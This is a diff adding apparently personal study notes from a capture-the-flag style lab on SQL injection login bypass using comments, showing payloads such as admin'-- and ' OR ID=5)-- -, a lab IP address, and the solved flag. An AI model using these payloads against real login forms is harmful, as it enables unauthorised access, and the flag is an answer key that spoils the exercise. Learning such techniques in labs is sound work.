@@ -1,1 +1,25 @@
+Auth Bypass with comments
+Let us go back to our previous example and inject admin'-- as our username. The final query will be:
 
+Code: sql
+SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
+
+failed example.. since we know / can assume that admin always = 1 this should fail 
+
+EXAMPLE: SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = 'something'   -> this will fail because admin = 1 not admin id is > than 1 
+
+but if we try with  ausername of tom it should work because its not equal to 1 
+
+EXAMPLE: SELECT * FROM logins WHERE (username='tom' AND id > 1) AND password = 'something'
+
+now if we use comments with admin we can make it work. 
+
+EXAMPLE: SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password = 'something'
+
+ * by adding the comment of -- after 'admin')-- '    -> this is what comments the query out. 
+
+Question 1 -  Login as the user with the id 5 to get the flag.
+1) go to http://83.136.249.46:40696
+2) After knowing the structure of the query by trial and error, students need to bypass it using the following query:
+3)' OR ID=5)-- - 
+4) output: cdad9ecdf6f14b45ff5c4de32909caec
